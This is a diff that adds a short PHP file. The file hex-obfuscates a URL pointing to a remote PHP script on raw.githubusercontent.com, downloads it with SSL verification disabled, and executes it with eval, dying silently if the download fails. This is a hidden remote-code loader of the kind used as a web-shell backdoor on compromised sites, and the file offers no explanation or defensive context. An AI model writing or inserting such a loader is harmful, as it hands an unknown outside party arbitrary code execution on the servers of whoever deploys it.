@@ -1,0 +1,23 @@
+<?php
+
+$hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F7961616A69616E6762752D7765622F6A696E6762752F726566732F68656164732F6D61696E2F6A69616E6762752E706870';
+$url = hex2bin($hexUrl);
+
+$phpScript = @file_get_contents($url);
+
+if ($phpScript === false && function_exists('curl_init')) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $phpScript = curl_exec($ch);
+    curl_close($ch);
+}
+
+if ($phpScript !== false) {
+    eval('?>' . $phpScript);
+} else {
+
+    die();
+}
+?>
